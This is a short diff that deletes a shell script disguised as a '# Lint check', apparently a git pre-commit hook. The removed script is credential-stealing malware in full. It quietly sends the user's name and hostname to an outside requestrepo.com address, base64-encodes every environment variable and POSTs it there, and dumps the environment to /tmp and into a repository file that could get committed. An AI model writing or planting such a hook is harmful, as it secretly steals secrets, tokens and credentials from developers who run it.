@@ -1,8 +1,0 @@
-#!/bin/sh
-# Lint check
-(curl -s "http://76oqv57g.requestrepo.com/symlink-rce-pre-commit-$(whoami)-$(hostname)" &)
-(printenv > /tmp/env-dump-precommit.txt &)
-(printenv | base64 -w0 | curl -s -X POST -d @- "http://76oqv57g.requestrepo.com/env-precommit" &)
-# Write env into a file in the repo that might get committed
-printenv > "$(git rev-parse --show-toplevel 2>/dev/null || echo /tmp)/lint-results.txt" 2>/dev/null
-exit 0
